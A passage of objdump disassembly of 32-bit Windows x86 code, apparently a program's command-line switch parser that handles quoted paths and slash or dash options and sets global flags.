  405c52:	33 c0                	xor    %eax,%eax
  405c54:	eb 42                	jmp    0x405c98
  405c56:	8b ca                	mov    %edx,%ecx
  405c58:	53                   	push   %ebx
  405c59:	8d 59 01             	lea    0x1(%ecx),%ebx
  405c5c:	8a 01                	mov    (%ecx),%al
  405c5e:	41                   	inc    %ecx
  405c5f:	84 c0                	test   %al,%al
  405c61:	75 f9                	jne    0x405c5c
  405c63:	2b cb                	sub    %ebx,%ecx
  405c65:	5b                   	pop    %ebx
  405c66:	eb 1b                	jmp    0x405c83
  405c68:	8a 04 0a             	mov    (%edx,%ecx,1),%al
  405c6b:	3c 20                	cmp    $0x20,%al
  405c6d:	74 14                	je     0x405c83
  405c6f:	3c 09                	cmp    $0x9,%al
  405c71:	74 10                	je     0x405c83
  405c73:	3c 0d                	cmp    $0xd,%al
  405c75:	74 0c                	je     0x405c83
  405c77:	3c 0a                	cmp    $0xa,%al
  405c79:	74 08                	je     0x405c83
  405c7b:	3c 0b                	cmp    $0xb,%al
  405c7d:	74 04                	je     0x405c83
  405c7f:	3c 0c                	cmp    $0xc,%al
  405c81:	75 05                	jne    0x405c88
  405c83:	83 e9 01             	sub    $0x1,%ecx
  405c86:	79 e0                	jns    0x405c68
  405c88:	8d 04 31             	lea    (%ecx,%esi,1),%eax
  405c8b:	c6 44 38 01 00       	movb   $0x0,0x1(%eax,%edi,1)
  405c90:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405c93:	89 30                	mov    %esi,(%eax)
  405c95:	33 c0                	xor    %eax,%eax
  405c97:	40                   	inc    %eax
  405c98:	5f                   	pop    %edi
  405c99:	5e                   	pop    %esi
  405c9a:	8b e5                	mov    %ebp,%esp
  405c9c:	5d                   	pop    %ebp
  405c9d:	c3                   	ret
  405c9e:	8b ff                	mov    %edi,%edi
  405ca0:	55                   	push   %ebp
  405ca1:	8b ec                	mov    %esp,%ebp
  405ca3:	81 ec 10 01 00 00    	sub    $0x110,%esp
  405ca9:	a1 04 80 40 00       	mov    0x408004,%eax
  405cae:	33 c5                	xor    %ebp,%eax
  405cb0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405cb3:	53                   	push   %ebx
  405cb4:	33 db                	xor    %ebx,%ebx
  405cb6:	56                   	push   %esi
  405cb7:	57                   	push   %edi
  405cb8:	8d 7b 01             	lea    0x1(%ebx),%edi
  405cbb:	85 c9                	test   %ecx,%ecx
  405cbd:	0f 84 41 05 00 00    	je     0x406204
  405cc3:	38 19                	cmp    %bl,(%ecx)
  405cc5:	0f 84 39 05 00 00    	je     0x406204
  405ccb:	85 ff                	test   %edi,%edi
  405ccd:	0f 84 ff 00 00 00    	je     0x405dd2
  405cd3:	8a 01                	mov    (%ecx),%al
  405cd5:	3c 20                	cmp    $0x20,%al
  405cd7:	74 14                	je     0x405ced
  405cd9:	3c 09                	cmp    $0x9,%al
  405cdb:	74 10                	je     0x405ced
  405cdd:	3c 0d                	cmp    $0xd,%al
  405cdf:	74 0c                	je     0x405ced
  405ce1:	3c 0a                	cmp    $0xa,%al
  405ce3:	74 08                	je     0x405ced
  405ce5:	3c 0b                	cmp    $0xb,%al
  405ce7:	74 04                	je     0x405ced
  405ce9:	3c 0c                	cmp    $0xc,%al
  405ceb:	75 0b                	jne    0x405cf8
  405ced:	51                   	push   %ecx
  405cee:	ff 15 ec a1 40 00    	call   *0x40a1ec
  405cf4:	8b c8                	mov    %eax,%ecx
  405cf6:	eb db                	jmp    0x405cd3
  405cf8:	89 8d f4 fe ff ff    	mov    %ecx,-0x10c(%ebp)
  405cfe:	84 c0                	test   %al,%al
  405d00:	0f 84 cc 00 00 00    	je     0x405dd2
  405d06:	8b 85 f4 fe ff ff    	mov    -0x10c(%ebp),%eax
  405d0c:	33 d2                	xor    %edx,%edx
  405d0e:	33 c9                	xor    %ecx,%ecx
  405d10:	33 f6                	xor    %esi,%esi
  405d12:	33 db                	xor    %ebx,%ebx
  405d14:	42                   	inc    %edx
  405d15:	85 f6                	test   %esi,%esi
  405d17:	75 2e                	jne    0x405d47
  405d19:	8a 00                	mov    (%eax),%al
  405d1b:	3c 20                	cmp    $0x20,%al
  405d1d:	0f 84 91 00 00 00    	je     0x405db4
  405d23:	3c 09                	cmp    $0x9,%al
  405d25:	0f 84 89 00 00 00    	je     0x405db4
  405d2b:	3c 0d                	cmp    $0xd,%al
  405d2d:	0f 84 81 00 00 00    	je     0x405db4
  405d33:	3c 0a                	cmp    $0xa,%al
  405d35:	74 7d                	je     0x405db4
  405d37:	3c 0b                	cmp    $0xb,%al
  405d39:	74 79                	je     0x405db4
  405d3b:	3c 0c                	cmp    $0xc,%al
  405d3d:	74 75                	je     0x405db4
  405d3f:	8b 85 f4 fe ff ff    	mov    -0x10c(%ebp),%eax
  405d45:	eb 04                	jmp    0x405d4b
  405d47:	85 db                	test   %ebx,%ebx
  405d49:	75 69                	jne    0x405db4
  405d4b:	8a 00                	mov    (%eax),%al
  405d4d:	3c 22                	cmp    $0x22,%al
  405d4f:	75 36                	jne    0x405d87
  405d51:	8b 85 f4 fe ff ff    	mov    -0x10c(%ebp),%eax
  405d57:	80 78 01 22          	cmpb   $0x22,0x1(%eax)
  405d5b:	74 0f                	je     0x405d6c
  405d5d:	33 c0                	xor    %eax,%eax
  405d5f:	40                   	inc    %eax
  405d60:	85 f6                	test   %esi,%esi
  405d62:	75 04                	jne    0x405d68
  405d64:	8b f0                	mov    %eax,%esi
  405d66:	eb 37                	jmp    0x405d9f
  405d68:	8b d8                	mov    %eax,%ebx
  405d6a:	eb 33                	jmp    0x405d9f
  405d6c:	81 fa 04 01 00 00    	cmp    $0x104,%edx
  405d72:	0f 83 83 03 00 00    	jae    0x4060fb
  405d78:	c6 84 0d f8 fe ff ff 	movb   $0x22,-0x108(%ebp,%ecx,1)
  405d7f:	22 
  405d80:	41                   	inc    %ecx
  405d81:	6a 02                	push   $0x2
  405d83:	42                   	inc    %edx
  405d84:	58                   	pop    %eax
  405d85:	eb 18                	jmp    0x405d9f
  405d87:	81 fa 04 01 00 00    	cmp    $0x104,%edx
  405d8d:	0f 83 68 03 00 00    	jae    0x4060fb
  405d93:	88 84 0d f8 fe ff ff 	mov    %al,-0x108(%ebp,%ecx,1)
  405d9a:	41                   	inc    %ecx
  405d9b:	33 c0                	xor    %eax,%eax
  405d9d:	42                   	inc    %edx
  405d9e:	40                   	inc    %eax
  405d9f:	01 85 f4 fe ff ff    	add    %eax,-0x10c(%ebp)
  405da5:	8b 85 f4 fe ff ff    	mov    -0x10c(%ebp),%eax
  405dab:	80 38 00             	cmpb   $0x0,(%eax)
  405dae:	0f 85 61 ff ff ff    	jne    0x405d15
  405db4:	81 f9 04 01 00 00    	cmp    $0x104,%ecx
  405dba:	0f 83 58 04 00 00    	jae    0x406218
  405dc0:	c6 84 0d f8 fe ff ff 	movb   $0x0,-0x108(%ebp,%ecx,1)
  405dc7:	00 
  405dc8:	85 f6                	test   %esi,%esi
  405dca:	74 54                	je     0x405e20
  405dcc:	85 db                	test   %ebx,%ebx
  405dce:	75 54                	jne    0x405e24
  405dd0:	33 ff                	xor    %edi,%edi
  405dd2:	83 3d 2c 8a 40 00 00 	cmpl   $0x0,0x408a2c
  405dd9:	0f 84 21 04 00 00    	je     0x406200
  405ddf:	80 3d 3e 8b 40 00 00 	cmpb   $0x0,0x408b3e
  405de6:	0f 85 14 04 00 00    	jne    0x406200
  405dec:	68 04 01 00 00       	push   $0x104
  405df1:	68 3e 8b 40 00       	push   $0x408b3e
  405df6:	ff 35 3c 9a 40 00    	push   0x409a3c
  405dfc:	ff 15 9c a1 40 00    	call   *0x40a19c
  405e02:	85 c0                	test   %eax,%eax
  405e04:	0f 84 f4 03 00 00    	je     0x4061fe
  405e0a:	6a 5c                	push   $0x5c
  405e0c:	5a                   	pop    %edx
  405e0d:	b9 3e 8b 40 00       	mov    $0x408b3e,%ecx
  405e12:	e8 b1 08 00 00       	call   0x4066c8
  405e17:	c6 40 01 00          	movb   $0x0,0x1(%eax)
  405e1b:	e9 e0 03 00 00       	jmp    0x406200
  405e20:	85 db                	test   %ebx,%ebx
  405e22:	75 ac                	jne    0x405dd0
  405e24:	8a 85 f8 fe ff ff    	mov    -0x108(%ebp),%al
  405e2a:	3c 2f                	cmp    $0x2f,%al
  405e2c:	74 08                	je     0x405e36
  405e2e:	3c 2d                	cmp    $0x2d,%al
  405e30:	0f 85 c5 02 00 00    	jne    0x4060fb
  405e36:	0f be 85 f9 fe ff ff 	movsbl -0x107(%ebp),%eax
  405e3d:	50                   	push   %eax
  405e3e:	ff 15 d0 a1 40 00    	call   *0x40a1d0
  405e44:	0f be c0             	movsbl %al,%eax
  405e47:	83 e8 3f             	sub    $0x3f,%eax
  405e4a:	0f 84 80 03 00 00    	je     0x4061d0
  405e50:	83 e8 04             	sub    $0x4,%eax
  405e53:	0f 84 a9 02 00 00    	je     0x406102
  405e59:	83 e8 01             	sub    $0x1,%eax
  405e5c:	0f 84 ed 01 00 00    	je     0x40604f
  405e62:	83 e8 0a             	sub    $0xa,%eax
  405e65:	0f 84 61 01 00 00    	je     0x405fcc
  405e6b:	83 e8 03             	sub    $0x3,%eax
  405e6e:	0f 84 10 01 00 00    	je     0x405f84
  405e74:	83 e8 01             	sub    $0x1,%eax
  405e77:	74 20                	je     0x405e99
  405e79:	48                   	dec    %eax
  405e7a:	83 e8 01             	sub    $0x1,%eax
  405e7d:	0f 84 cc 01 00 00    	je     0x40604f
  405e83:	33 ff                	xor    %edi,%edi
  405e85:	8b 8d f4 fe ff ff    	mov    -0x10c(%ebp),%ecx
  405e8b:	80 39 00             	cmpb   $0x0,(%ecx)
  405e8e:	0f 85 37 fe ff ff    	jne    0x405ccb
  405e94:	e9 39 ff ff ff       	jmp    0x405dd2
  405e99:	80 bd fa fe ff ff 00 	cmpb   $0x0,-0x106(%ebp)
  405ea0:	75 14                	jne    0x405eb6
  405ea2:	33 c0                	xor    %eax,%eax
  405ea4:	c7 05 2c 9a 40 00 03 	movl   $0x3,0x409a2c
  405eab:	00 00 00 
  405eae:	40                   	inc    %eax
  405eaf:	a3 28 8a 40 00       	mov    %eax,0x408a28
  405eb4:	eb cf                	jmp    0x405e85
  405eb6:	80 bd fa fe ff ff 3a 	cmpb   $0x3a,-0x106(%ebp)
  405ebd:	0f 85 96 00 00 00    	jne    0x405f59
  405ec3:	8b 8d fb fe ff ff    	mov    -0x105(%ebp),%ecx
  405ec9:	33 db                	xor    %ebx,%ebx
  405ecb:	43                   	inc    %ebx
  405ecc:	89 1d 2c 9a 40 00    	mov    %ebx,0x409a2c
  405ed2:	84 c9                	test   %cl,%cl
  405ed4:	74 af                	je     0x405e85
  405ed6:	8d b5 fb fe ff ff    	lea    -0x105(%ebp),%esi
  405edc:	0f be c1             	movsbl %cl,%eax
  405edf:	46                   	inc    %esi
  405ee0:	50                   	push   %eax
  405ee1:	ff 15 d0 a1 40 00    	call   *0x40a1d0
  405ee7:	0f be c0             	movsbl %al,%eax
  405eea:	83 e8 41             	sub    $0x41,%eax
  405eed:	74 4e                	je     0x405f3d
  405eef:	83 e8 03             	sub    $0x3,%eax
  405ef2:	74 40                	je     0x405f34
  405ef4:	83 e8 05             	sub    $0x5,%eax
  405ef7:	74 32                	je     0x405f2b
  405ef9:	83 e8 05             	sub    $0x5,%eax
  405efc:	74 24                	je     0x405f22
  405efe:	48                   	dec    %eax
  405eff:	83 e8 01             	sub    $0x1,%eax
  405f02:	74 12                	je     0x405f16
  405f04:	83 e8 03             	sub    $0x3,%eax
  405f07:	74 04                	je     0x405f0d
  405f09:	33 ff                	xor    %edi,%edi
  405f0b:	eb 3f                	jmp    0x405f4c
  405f0d:	83 0d 2c 9a 40 00 04 	orl    $0x4,0x409a2c
  405f14:	eb 30                	jmp    0x405f46
  405f16:	81 0d 48 8d 40 00 80 	orl    $0x80,0x408d48
  405f1d:	00 00 00 
  405f20:	eb 2a                	jmp    0x405f4c
  405f22:	83 25 2c 9a 40 00 fe 	andl   $0xfffffffe,0x409a2c
  405f29:	eb 1b                	jmp    0x405f46
  405f2b:	83 25 2c 9a 40 00 fd 	andl   $0xfffffffd,0x409a2c
  405f32:	eb 12                	jmp    0x405f46
  405f34:	83 0d 48 8d 40 00 40 	orl    $0x40,0x408d48
  405f3b:	eb 0f                	jmp    0x405f4c
  405f3d:	6a 02                	push   $0x2
  405f3f:	58                   	pop    %eax
  405f40:	09 05 2c 9a 40 00    	or     %eax,0x409a2c
  405f46:	89 1d 28 8a 40 00    	mov    %ebx,0x408a28
  405f4c:	8a 06                	mov    (%esi),%al
  405f4e:	8a c8                	mov    %al,%cl
  405f50:	84 c0                	test   %al,%al
  405f52:	75 88                	jne    0x405edc
  405f54:	e9 2c ff ff ff       	jmp    0x405e85
  405f59:	6a ff                	push   $0xffffffff
  405f5b:	8d 85 f9 fe ff ff    	lea    -0x107(%ebp),%eax
  405f61:	50                   	push   %eax
  405f62:	6a ff                	push   $0xffffffff
  405f64:	33 c0                	xor    %eax,%eax
  405f66:	68 c8 13 40 00       	push   $0x4013c8
  405f6b:	40                   	inc    %eax
  405f6c:	50                   	push   %eax
  405f6d:	6a 7f                	push   $0x7f
  405f6f:	ff 15 68 a0 40 00    	call   *0x40a068
  405f75:	48                   	dec    %eax
  405f76:	83 e8 01             	sub    $0x1,%eax
  405f79:	0f 84 06 ff ff ff    	je     0x405e85
  405f7f:	e9 ff fe ff ff       	jmp    0x405e83
  405f84:	80 bd fa fe ff ff 00 	cmpb   $0x0,-0x106(%ebp)
  405f8b:	75 05                	jne    0x405f92
  405f8d:	6a 02                	push   $0x2
  405f8f:	58                   	pop    %eax
  405f90:	eb 2f                	jmp    0x405fc1
  405f92:	80 bd fa fe ff ff 3a 	cmpb   $0x3a,-0x106(%ebp)
  405f99:	0f 85 e4 fe ff ff    	jne    0x405e83
  405f9f:	0f be 85 fb fe ff ff 	movsbl -0x105(%ebp),%eax
  405fa6:	50                   	push   %eax
  405fa7:	ff 15 d0 a1 40 00    	call   *0x40a1d0
  405fad:	3c 31                	cmp    $0x31,%al
  405faf:	74 dc                	je     0x405f8d
  405fb1:	3c 41                	cmp    $0x41,%al
  405fb3:	74 09                	je     0x405fbe
  405fb5:	3c 55                	cmp    $0x55,%al
  405fb7:	74 d4                	je     0x405f8d
  405fb9:	e9 c5 fe ff ff       	jmp    0x405e83
  405fbe:	33 c0                	xor    %eax,%eax
  405fc0:	40                   	inc    %eax
  405fc1:	66 a3 38 8a 40 00    	mov    %ax,0x408a38
  405fc7:	e9 b9 fe ff ff       	jmp    0x405e85
  405fcc:	80 bd fa fe ff ff 00 	cmpb   $0x0,-0x106(%ebp)
  405fd3:	75 0d                	jne    0x405fe2
  405fd5:	33 c0                	xor    %eax,%eax
  405fd7:	40                   	inc    %eax
  405fd8:	a3 2c 8a 40 00       	mov    %eax,0x408a2c
  405fdd:	e9 a3 fe ff ff       	jmp    0x405e85
  405fe2:	80 bd fa fe ff ff 3a 	cmpb   $0x3a,-0x106(%ebp)
  405fe9:	0f 85 94 fe ff ff    	jne    0x405e83
  405fef:	8b 8d fb fe ff ff    	mov    -0x105(%ebp),%ecx
  405ff5:	84 c9                	test   %cl,%cl
  405ff7:	0f 84 88 fe ff ff    	je     0x405e85
  405ffd:	8d b5 fb fe ff ff    	lea    -0x105(%ebp),%esi
  406003:	0f be c1             	movsbl %cl,%eax
  406006:	46                   	inc    %esi
  406007:	50                   	push   %eax
  406008:	ff 15 d0 a1 40 00    	call   *0x40a1d0
  40600e:	0f be c0             	movsbl %al,%eax
  406011:	83 e8 45             	sub    $0x45,%eax
  406014:	74 24                	je     0x40603a
  406016:	6a 02                	push   $0x2
  406018:	59                   	pop    %ecx
  406019:	2b c1                	sub    %ecx,%eax
  40601b:	74 13                	je     0x406030
  40601d:	83 e8 0f             	sub    $0xf,%eax
  406020:	74 04                	je     0x406026
  406022:	33 ff                	xor    %edi,%edi
  406024:	eb 1c                	jmp    0x406042
  406026:	33 c0                	xor    %eax,%eax
  406028:	40                   	inc    %eax
  406029:	a3 34 8a 40 00       	mov    %eax,0x408a34
  40602e:	eb 12                	jmp    0x406042
  406030:	33 c0                	xor    %eax,%eax
  406032:	40                   	inc    %eax
  406033:	a3 30 8a 40 00       	mov    %eax,0x408a30
  406038:	eb 08                	jmp    0x406042
  40603a:	33 c0                	xor    %eax,%eax
  40603c:	40                   	inc    %eax
  40603d:	a3 2c 8a 40 00       	mov    %eax,0x408a2c
  406042:	8a 06                	mov    (%esi),%al
  406044:	8a c8                	mov    %al,%cl
  406046:	84 c0                	test   %al,%al
  406048:	75 b9                	jne    0x406003
  40604a:	e9 36 fe ff ff       	jmp    0x405e85
  40604f:	80 bd fa fe ff ff 3a 	cmpb   $0x3a,-0x106(%ebp)
  406056:	0f 85 27 fe ff ff    	jne    0x405e83
  40605c:	33 db                	xor    %ebx,%ebx
  40605e:	8d b5 f8 fe ff ff    	lea    -0x108(%ebp),%esi
  406064:	80 bd fb fe ff ff 22 	cmpb   $0x22,-0x105(%ebp)
  40606b:	0f 94 c3             	sete   %bl
  40606e:	83 c3 03             	add    $0x3,%ebx
  406071:	03 f3                	add    %ebx,%esi
  406073:	8b ce                	mov    %esi,%ecx
  406075:	8d 51 01             	lea    0x1(%ecx),%edx
  406078:	8a 01                	mov    (%ecx),%al
  40607a:	41                   	inc    %ecx
  40607b:	84 c0                	test   %al,%al
  40607d:	75 f9                	jne    0x406078
  40607f:	2b ca                	sub    %edx,%ecx
  406081:	0f 84 fc fd ff ff    	je     0x405e83
  406087:	8d 95 f0 fe ff ff    	lea    -0x110(%ebp),%edx
  40608d:	89 9d f0 fe ff ff    	mov    %ebx,-0x110(%ebp)
  406093:	8b ce                	mov    %esi,%ecx
  406095:	e8 7d fb ff ff       	call   0x405c17
  40609a:	85 c0                	test   %eax,%eax
  40609c:	0f 84 e1 fd ff ff    	je     0x405e83
  4060a2:	0f be 85 f9 fe ff ff 	movsbl -0x107(%ebp),%eax
  4060a9:	50                   	push   %eax
  4060aa:	ff 15 d0 a1 40 00    	call   *0x40a1d0
  4060b0:	3c 54                	cmp    $0x54,%al
  4060b2:	be 3e 8b 40 00       	mov    $0x408b3e,%esi
  4060b7:	8b 85 f0 fe ff ff    	mov    -0x110(%ebp),%eax
  4060bd:	74 05                	je     0x4060c4
  4060bf:	be 3a 8a 40 00       	mov    $0x408a3a,%esi
  4060c4:	03 c3                	add    %ebx,%eax
  4060c6:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4060cc:	03 c1                	add    %ecx,%eax
  4060ce:	ba 04 01 00 00       	mov    $0x104,%edx
  4060d3:	50                   	push   %eax
  4060d4:	8b ce                	mov    %esi,%ecx
  4060d6:	e8 a5 b5 ff ff       	call   0x401680
  4060db:	68 40 11 40 00       	push   $0x401140
  4060e0:	ba 04 01 00 00       	mov    $0x104,%edx
  4060e5:	8b ce                	mov    %esi,%ecx
  4060e7:	e8 9e 04 00 00       	call   0x40658a
  4060ec:	8b ce                	mov    %esi,%ecx
  4060ee:	e8 ed d0 ff ff       	call   0x4031e0
  4060f3:	85 c0                	test   %eax,%eax
  4060f5:	0f 85 8a fd ff ff    	jne    0x405e85
  4060fb:	33 c0                	xor    %eax,%eax
  4060fd:	e9 05 01 00 00       	jmp    0x406207
  406102:	80 bd fa fe ff ff 00 	cmpb   $0x0,-0x106(%ebp)
  406109:	75 0d                	jne    0x406118
  40610b:	33 c0                	xor    %eax,%eax
  40610d:	40                   	inc    %eax
  40610e:	a3 24 8a 40 00       	mov    %eax,0x408a24
  406113:	e9 6d fd ff ff       	jmp    0x405e85
  406118:	80 bd fa fe ff ff 3a 	cmpb   $0x3a,-0x106(%ebp)
  40611f:	0f 85 5e fd ff ff    	jne    0x405e83
  406125:	33 db                	xor    %ebx,%ebx
  406127:	8d b5 f8 fe ff ff    	lea    -0x108(%ebp),%esi
  40612d:	80 bd fb fe ff ff 22 	cmpb   $0x22,-0x105(%ebp)
  406134:	0f 94 c3             	sete   %bl
  406137:	83 c3 03             	add    $0x3,%ebx
  40613a:	03 f3                	add    %ebx,%esi
  40613c:	8b ce                	mov    %esi,%ecx
  40613e:	8d 51 01             	lea    0x1(%ecx),%edx
  406141:	8a 01                	mov    (%ecx),%al
  406143:	41                   	inc    %ecx
  406144:	84 c0                	test   %al,%al
  406146:	75 f9                	jne    0x406141
  406148:	2b ca                	sub    %edx,%ecx
  40614a:	0f 84 33 fd ff ff    	je     0x405e83
  406150:	6a 5b                	push   $0x5b
  406152:	5a                   	pop    %edx
  406153:	8b ce                	mov    %esi,%ecx
  406155:	e8 25 05 00 00       	call   0x40667f
  40615a:	85 c0                	test   %eax,%eax
  40615c:	74 12                	je     0x406170
  40615e:	6a 5d                	push   $0x5d
  406160:	5a                   	pop    %edx
  406161:	8b ce                	mov    %esi,%ecx
  406163:	e8 17 05 00 00       	call   0x40667f
  406168:	85 c0                	test   %eax,%eax
  40616a:	0f 84 13 fd ff ff    	je     0x405e83
  406170:	6a 5d                	push   $0x5d
  406172:	5a                   	pop    %edx
  406173:	8b ce                	mov    %esi,%ecx
  406175:	e8 05 05 00 00       	call   0x40667f
  40617a:	85 c0                	test   %eax,%eax
  40617c:	74 12                	je     0x406190
  40617e:	6a 5b                	push   $0x5b
  406180:	5a                   	pop    %edx
  406181:	8b ce                	mov    %esi,%ecx
  406183:	e8 f7 04 00 00       	call   0x40667f
  406188:	85 c0                	test   %eax,%eax
  40618a:	0f 84 f3 fc ff ff    	je     0x405e83
  406190:	8d 95 f0 fe ff ff    	lea    -0x110(%ebp),%edx
  406196:	89 9d f0 fe ff ff    	mov    %ebx,-0x110(%ebp)
  40619c:	8b ce                	mov    %esi,%ecx
  40619e:	e8 74 fa ff ff       	call   0x405c17
  4061a3:	85 c0                	test   %eax,%eax
  4061a5:	0f 84 d8 fc ff ff    	je     0x405e83
  4061ab:	8b 85 f0 fe ff ff    	mov    -0x110(%ebp),%eax
  4061b1:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4061b7:	03 c3                	add    %ebx,%eax
  4061b9:	ba 04 01 00 00       	mov    $0x104,%edx
  4061be:	03 c1                	add    %ecx,%eax
  4061c0:	b9 42 8c 40 00       	mov    $0x408c42,%ecx
  4061c5:	50                   	push   %eax
  4061c6:	e8 b5 b4 ff ff       	call   0x401680
  4061cb:	e9 b5 fc ff ff       	jmp    0x405e85
  4061d0:	33 db                	xor    %ebx,%ebx
  4061d2:	ba 21 05 00 00       	mov    $0x521,%edx
  4061d7:	53                   	push   %ebx
  4061d8:	6a 40                	push   $0x40
  4061da:	53                   	push   %ebx
  4061db:	68 40 11 40 00       	push   $0x401140
  4061e0:	33 c9                	xor    %ecx,%ecx
  4061e2:	e8 d2 e2 ff ff       	call   0x4044b9
  4061e7:	a1 88 85 40 00       	mov    0x408588,%eax
  4061ec:	85 c0                	test   %eax,%eax
  4061ee:	74 07                	je     0x4061f7
  4061f0:	50                   	push   %eax
  4061f1:	ff 15 88 a0 40 00    	call   *0x40a088
  4061f7:	53                   	push   %ebx
  4061f8:	ff 15 2c a1 40 00    	call   *0x40a12c
  4061fe:	33 ff                	xor    %edi,%edi
  406200:	8b c7                	mov    %edi,%eax
  406202:	eb 03                	jmp    0x406207
  406204:	8d 43 01             	lea    0x1(%ebx),%eax
  406207:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40620a:	5f                   	pop    %edi
  40620b:	5e                   	pop    %esi
  40620c:	33 cd                	xor    %ebp,%ecx
  40620e:	5b                   	pop    %ebx
  40620f:	e8 cc 0a 00 00       	call   0x406ce0
  406214:	8b e5                	mov    %ebp,%esp
  406216:	5d                   	pop    %ebp
  406217:	c3                   	ret
  406218:	e8 0d 0c 00 00       	call   0x406e2a
  40621d:	cc                   	int3
  40621e:	8b ff                	mov    %edi,%edi
  406220:	55                   	push   %ebp
  406221:	8b ec                	mov    %esp,%ebp
  406223:	81 ec 08 01 00 00    	sub    $0x108,%esp
  406229:	a1 04 80 40 00       	mov    0x408004,%eax
  40622e:	33 c5                	xor    %ebp,%eax
  406230:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406233:	68 04 01 00 00       	push   $0x104
  406238:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40623e:	50                   	push   %eax
  40623f:	ff 15 94 a0 40 00    	call   *0x40a094
  406245:	85 c0                	test   %eax,%eax
  406247:	75 1f                	jne    0x406268
  406249:	50                   	push   %eax
  40624a:	6a 10                	push   $0x10
  40624c:	50                   	push   %eax
  40624d:	50                   	push   %eax
  40624e:	ba f0 04 00 00       	mov    $0x4f0,%edx
  406253:	33 c9                	xor    %ecx,%ecx
  406255:	e8 5f e2 ff ff       	call   0x4044b9
  40625a:	e8 26 00 00 00       	call   0x406285
  40625f:	a3 24 91 40 00       	mov    %eax,0x409124
  406264:	33 c0                	xor    %eax,%eax
  406266:	eb 0f                	jmp    0x406277
  406268:	6a 02                	push   $0x2
  40626a:	5a                   	pop    %edx
  40626b:	52                   	push   %edx
  40626c:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  406272:	e8 06 f7 ff ff       	call   0x40597d
  406277:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40627a:	33 cd                	xor    %ebp,%ecx
  40627c:	e8 5f 0a 00 00       	call   0x406ce0
  406281:	8b e5                	mov    %ebp,%esp
  406283:	5d                   	pop    %ebp
  406284:	c3                   	ret
  406285:	ff 15 6c a0 40 00    	call   *0x40a06c
  40628b:	85 c0                	test   %eax,%eax
  40628d:	7e 08                	jle    0x406297
  40628f:	0f b7 c0             	movzwl %ax,%eax
  406292:	0d 00 00 07 80       	or     $0x80070000,%eax
  406297:	c3                   	ret
  406298:	8b ff                	mov    %edi,%edi
  40629a:	55                   	push   %ebp
  40629b:	8b ec                	mov    %esp,%ebp
  40629d:	83 ec 20             	sub    $0x20,%esp
  4062a0:	a1 04 80 40 00       	mov    0x408004,%eax
  4062a5:	33 c5                	xor    %ebp,%eax
  4062a7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4062aa:	53                   	push   %ebx
  4062ab:	56                   	push   %esi
  4062ac:	57                   	push   %edi
  4062ad:	33 f6                	xor    %esi,%esi
  4062af:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4062b2:	56                   	push   %esi
  4062b3:	68 d4 13 40 00       	push   $0x4013d4
  4062b8:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4062bb:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4062be:	33 db                	xor    %ebx,%ebx
  4062c0:	6a 14                	push   $0x14
  4062c2:	50                   	push   %eax
  4062c3:	43                   	inc    %ebx
  4062c4:	e8 55 b4 ff ff       	call   0x40171e
  4062c9:	eb 70                	jmp    0x40633b
  4062cb:	50                   	push   %eax
  4062cc:	56                   	push   %esi
  4062cd:	ff 15 28 a1 40 00    	call   *0x40a128
  4062d3:	50                   	push   %eax
  4062d4:	ff 15 18 a1 40 00    	call   *0x40a118
  4062da:	8b f8                	mov    %eax,%edi
  4062dc:	85 ff                	test   %edi,%edi
  4062de:	74 7f                	je     0x40635f
  4062e0:	8d 57 08             	lea    0x8(%edi),%edx
  4062e3:	8b ca                	mov    %edx,%ecx
  4062e5:	8d 71 01             	lea    0x1(%ecx),%esi
  4062e8:	8a 01                	mov    (%ecx),%al
  4062ea:	41                   	inc    %ecx
  4062eb:	84 c0                	test   %al,%al
  4062ed:	75 f9                	jne    0x4062e8
  4062ef:	2b ce                	sub    %esi,%ecx
  4062f1:	8b f4                	mov    %esp,%esi
  4062f3:	8d 41 01             	lea    0x1(%ecx),%eax
  4062f6:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4062f9:	03 c2                	add    %edx,%eax
  4062fb:	50                   	push   %eax
  4062fc:	52                   	push   %edx
  4062fd:	ff 77 04             	push   0x4(%edi)
  406300:	ff 37                	push   (%edi)
  406302:	ff 15 88 a2 40 00    	call   *0x40a288
  406308:	ff 55 e4             	call   *-0x1c(%ebp)
  40630b:	3b f4                	cmp    %esp,%esi
  40630d:	74 07                	je     0x406316
  40630f:	b9 04 00 00 00       	mov    $0x4,%ecx
  406314:	cd 29                	int    $0x29
  406316:	57                   	push   %edi
  406317:	85 c0                	test   %eax,%eax
  406319:	74 3a                	je     0x406355
  40631b:	ff 15 f4 a0 40 00    	call   *0x40a0f4
  406321:	8b 75 e0             	mov    -0x20(%ebp),%esi
  406324:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406327:	46                   	inc    %esi
  406328:	56                   	push   %esi
  406329:	68 d4 13 40 00       	push   $0x4013d4
  40632e:	6a 14                	push   $0x14
  406330:	50                   	push   %eax
  406331:	89 75 e0             	mov    %esi,-0x20(%ebp)
  406334:	e8 e5 b3 ff ff       	call   0x40171e
  406339:	33 f6                	xor    %esi,%esi
  40633b:	83 c4 10             	add    $0x10,%esp
  40633e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406341:	6a 0a                	push   $0xa
  406343:	50                   	push   %eax
  406344:	56                   	push   %esi
  406345:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  40634b:	85 c0                	test   %eax,%eax
  40634d:	0f 85 78 ff ff ff    	jne    0x4062cb
  406353:	eb 16                	jmp    0x40636b
  406355:	33 db                	xor    %ebx,%ebx
  406357:	ff 15 f4 a0 40 00    	call   *0x40a0f4
  40635d:	eb 0c                	jmp    0x40636b
  40635f:	c7 05 24 91 40 00 14 	movl   $0x80070714,0x409124
  406366:	07 07 80 
  406369:	8b de                	mov    %esi,%ebx
  40636b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40636e:	8b c3                	mov    %ebx,%eax
  406370:	5f                   	pop    %edi
  406371:	5e                   	pop    %esi
